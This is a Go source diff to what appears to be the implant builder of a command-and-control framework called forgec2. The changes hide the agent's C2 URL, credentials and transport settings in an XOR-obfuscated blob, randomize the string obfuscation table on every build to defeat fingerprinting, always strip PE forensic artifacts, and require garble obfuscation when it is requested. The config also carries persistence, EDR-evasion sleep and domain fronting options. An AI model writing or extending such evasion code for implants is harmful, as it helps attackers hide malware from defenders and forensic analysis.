@@ -5,7 +5,6 @@ import (
 	"embed"
 	"encoding/json"
 	"fmt"
-	"log/slog"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -35,79 +34,20 @@ func escape(s string) string {
 }
 
 // buildLdflags constructs the full -ldflags content string for go build.
+// Agent runtime configuration is carried in a single XOR-obfuscated blob
+// injected via -X main.ConfigBlob (see buildConfigBlob); everything else is
+// resolved from the blob at agent init(). Only build-level flags remain.
 func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) string {
-	persist := "false"
-	if cfg.Persist {
-		persist = "true"
-	}
-	skipTLS := "false"
-	if cfg.SkipTLSVerify {
-		skipTLS = "true"
-	}
+	blob := buildConfigBlob(cfg, profile)
 
-	p2pMode := cfg.P2PMode
-	if p2pMode == "" && cfg.Protocol == "p2p" {
-		p2pMode = "tcp"
-	}
-
-	evasion := "false"
-	if cfg.Evasion {
-		evasion = "true"
-	}
-
-	prefix := "-s -w -buildid="
+	flags := "-s -w -buildid="
 	if goos == "windows" {
-		prefix += " -H=windowsgui"
+		flags += " -H=windowsgui"
 	}
-
-	listenerID := "0"
-	if cfg.ListenerID > 0 {
-		listenerID = fmt.Sprintf("%d", cfg.ListenerID)
+	if blob != "" {
+		flags += ` -X "main.ConfigBlob=` + escape(blob) + `"`
 	}
-
-	transport := cfg.BeaconTransport
-	if transport == "" {
-		transport = cfg.Protocol
-	}
-	if transport == "" {
-		transport = "http"
-	}
-
-	return fmt.Sprintf(prefix+` -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethodStr=%s" -X "main.ListenerIDStr=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.DNSDoHURL=%s" -X "main.DNSDoTAddr=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s" -X "main.WorkingStartStr=%s" -X "main.WorkingEndStr=%s" -X "main.WorkingTZStr=%s" -X "main.BeaconTransportStr=%s" -X "main.SSHUserStr=%s" -X "main.SSHPasswordStr=%s" -X "main.SSHKeyStr=%s" -X "main.SSHHostKeyStr=%s" -X "main.PinnedCertSHA256Str=%s" -X "main.SelfCheckSHA256Str=%s"`,
-		escape(cfg.C2URL),
-		cfg.Interval,
-		cfg.Jitter,
-		escape(cfg.UserAgent),
-		persist,
-		skipTLS,
-		cfg.Protocol,
-		fmt.Sprintf("%t", cfg.Debug),
-		escape(profile.BeaconURI),
-		profile.Method,
-		listenerID,
-		escape(p2pMode),
-		escape(cfg.P2PParent),
-		escape(cfg.P2PListenAddr),
-		escape(cfg.DNSDomain),
-		escape(cfg.DNSServer),
-		escape(cfg.DNSDoHURL),
-		escape(cfg.DNSDoTAddr),
-		escape(cfg.Proxy),
-		escape(cfg.CryptoKey),
-		escape(cfg.ExpiryDate),
-		evasion,
-		escape(cfg.DomainFront),
-		escape(cfg.WorkingStart),
-		escape(cfg.WorkingEnd),
-		escape(cfg.WorkingTZ),
-		escape(transport),
-		escape(cfg.SSHUser),
-		escape(cfg.SSHPassword),
-		escape(cfg.SSHKey),
-		escape(cfg.SSHHostKey),
-		escape(cfg.PinnedCertSHA256),
-		escape(cfg.SelfCheckSHA256),
-	)
+	return flags
 }
 
 // buildGoMod generates a go.mod file for the target OS.
@@ -432,6 +372,7 @@ type ImplantConfig struct {
 	DNSServer     string // DNS C2 server IP
 	Proxy         string // HTTP proxy URL (e.g. "http://proxy:8080")
 	CryptoKey     string // 32-byte hex key for StreamCipher (empty = disabled)
+	BeaconKey     string // PSK sent as envelope "key" + X-Beacon-Key header (empty = no PSK auth)
 	ExpiryDate    string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
 	Evasion       bool   // Enable chunked sleep obfuscation (Windows EDR basics)
 	Obfuscate     bool   // Enable garble build-time obfuscation (string/literal hiding)
@@ -442,32 +383,41 @@ type ImplantConfig struct {
 	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
 	WorkingTZ    string // IANA timezone (empty = UTC)
 	// Advanced transport (injected as ldflags into agent)
-	BeaconTransport string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c
-	DNSDoHURL       string
-	DNSDoTAddr      string
-	SSHUser         string
-	SSHPassword     string
-	SSHKey          string // base64 PEM client private key
-	SSHHostKey      string // base64 server host public key pin (empty = lab insecure)
-	PinnedCertSHA256  string // SHA-256 hex of server DER cert for pinning (empty = disabled)
-	SelfCheckSHA256   string // SHA-256 hex of the binary itself for integrity verification (empty = disabled)
+	BeaconTransport  string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c
+	DNSDoHURL        string
+	DNSDoTAddr       string
+	SSHUser          string
+	SSHPassword      string
+	SSHKey           string // base64 PEM client private key
+	SSHHostKey       string // base64 server host public key pin (empty = lab insecure)
+	PinnedCertSHA256 string // SHA-256 hex of server DER cert for pinning (empty = disabled)
+	SelfCheckSHA256  string // SHA-256 hex of the binary itself for integrity verification (empty = disabled)
 }
 
 // forgeC2ModuleReplace returns a `replace` directive for the local
 // github.com/forgec2/forgec2 module, so the temp agent build can
 // find it without requiring a remote git repository.
 func forgeC2ModuleReplace() string {
-	// Try to find the module root from the current working directory
-	// (the server is always launched from the project root).
+	// Walk upward from the working directory to find the module root
+	// (handles the server running from the project root AND go test runs,
+	// where the working directory is a subpackage).
 	wd, err := os.Getwd()
 	if err != nil {
-		return ""
+		wd = "."
 	}
-	// Verify go.mod exists
-	if _, err := os.Stat(filepath.Join(wd, "go.mod")); err != nil {
-		return ""
+	dir := wd
+	for {
+		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
+			// go.mod replace targets must use forward slashes even on Windows.
+			return "\nreplace github.com/forgec2/forgec2 => " + filepath.ToSlash(dir) + "\n"
+		}
+		parent := filepath.Dir(dir)
+		if parent == dir || parent == "." || len(parent) <= len(filepath.VolumeName(parent)) {
+			break
+		}
+		dir = parent
 	}
-	return "\nreplace github.com/forgec2/forgec2 => " + wd + "\n"
+	return ""
 }
 
 // GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
@@ -546,10 +496,9 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	// Post-build: strip PE forensic artifacts
-	if !cfg.Obfuscate {
-		stripPEArtifacts(outPath)
-	}
+	// Post-build: strip PE forensic artifacts (timestamp, Rich Header, Debug
+	// directory). Applied to every build — garble does not clean these.
+	stripPEArtifacts(outPath)
 
 	if _, err := os.Stat(outPath); err != nil {
 		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
@@ -629,30 +578,49 @@ func extractAgentSources(efs embed.FS, dir string) error {
 	if !hasAgentGo {
 		return fmt.Errorf("embedded agent directory missing agent.go")
 	}
+
+	// Every agent build gets a freshly randomized string table (fresh XOR keys
+	// per constant, plaintext comments stripped) so binaries are not
+	// fingerprinter-friendly against a static table.
+	if err := injectRandomizedStrxor(dir); err != nil {
+		return err
+	}
 	return nil
 }
 
-// buildAgentBinary runs `go build` or `garble build` with consistent hardening flags.
-func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch string) error {
-	buildArgs := []string{"build"}
-	if obfuscate {
-		// Try garble first
-		if garblePath, err := exec.LookPath("garble"); err == nil {
-			garbleArgs := append([]string{"-literals", "-tiny", "-seed=random", "build"}, buildArgs[1:]...)
-			cmd := exec.Command(garblePath, append(garbleArgs, "-ldflags", ldflags, "-o", outPath, "-trimpath", "-buildvcs=false", ".")...)
-			cmd.Dir = workDir
-			cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
-			var stderr bytes.Buffer
-			cmd.Stderr = &stderr
-			if err := cmd.Run(); err != nil {
-				slog.Warn("garble build failed, falling back to go build", "error", err, "stderr", stderr.String())
-			} else {
-				return nil
-			}
-		}
-		// garble not found or failed, fall through to regular build
+// injectRandomizedStrxor regenerates agent/strxor.go inside the build dir with
+// brand-new obfuscation values for this specific build.
+func injectRandomizedStrxor(buildDir string) error {
+	table, err := randomizeStrxor()
+	if err != nil {
+		return err
 	}
-	cmd := exec.Command(goCmd, append(buildArgs,
+	return os.WriteFile(filepath.Join(buildDir, "strxor.go"), table, 0644)
+}
+
+// buildAgentBinary runs `go build` or `garble build` with consistent hardening flags.
+// When obfuscate is requested, garble is REQUIRED: falling back to a plain
+// build would silently produce an un-obfuscated implant (a false security
+// promise), so a missing/broken garble fails the build instead.
+func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch string) error {
+	if obfuscate {
+		garblePath, err := exec.LookPath("garble")
+		if err != nil {
+			return fmt.Errorf("obfuscation requested but garble is not installed: install it with `go install mvdan.cc/garble@latest`")
+		}
+		args := append([]string{"-literals", "-tiny", "-seed=random", "build"},
+			"-ldflags", ldflags, "-o", outPath, "-trimpath", "-buildvcs=false", ".")
+		cmd := exec.Command(garblePath, args...)
+		cmd.Dir = workDir
+		cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
+		var stderr bytes.Buffer
+		cmd.Stderr = &stderr
+		if err := cmd.Run(); err != nil {
+			return fmt.Errorf("garble build failed: %w\n%s\n(re-run without obfuscation or fix the garble install)", err, stderr.String())
+		}
+		return nil
+	}
+	cmd := exec.Command(goCmd, append([]string{"build"},
 		"-ldflags", ldflags,
 		"-o", outPath,
 		"-trimpath",
